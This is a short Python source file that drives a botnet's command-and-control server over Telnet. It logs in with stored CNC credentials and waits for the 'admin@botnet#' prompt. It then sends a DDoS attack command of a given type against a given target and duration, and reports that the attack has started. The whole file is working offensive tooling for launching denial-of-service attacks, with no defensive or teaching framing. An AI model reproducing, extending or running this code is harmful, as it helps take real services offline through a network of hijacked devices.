import time
import telnetlib
import asyncio
from constants import (CNC_USERNAME, CNC_PASSWORD,TELNET_HOST,TELNET_PORT)

start_event = asyncio.Event()  # Erstelle ein Event

def ddos_attack_service(type, duration, target):
    """
    Handles the Telnet session for the 'DDOS' command.
    """

    with telnetlib.Telnet(TELNET_HOST, TELNET_PORT, timeout=20) as tn:
        print("Connected to cnc!")
        initial_output = tn.read_very_eager()
        print(initial_output)
        tn.write(b"\n")
        time.sleep(1)
        #tn.read_until("пользователь: ".encode('utf-8'))
        tn.write(CNC_USERNAME.encode('utf-8') + b"\n")
        time.sleep(1)
        #tn.read_until("пароль: ".encode('utf-8'))
        tn.write(CNC_PASSWORD.encode('utf-8') + b"\n")
        print("Wrote username and pw")

        while True:
            output = tn.read_very_eager().decode('utf-8', errors='ignore')
            #print(f"DDOS Telnet output: {output}")
            if "admin@botnet#" in output:
                print("We can write attack message")
                command = f"{type} {target} {duration}\n"
                tn.write(command.encode('utf-8'))
                print(f"Wrote: {command}")
                start_event.set()
                print("Set Event")
                break
    return "DDoS attack started successfully!"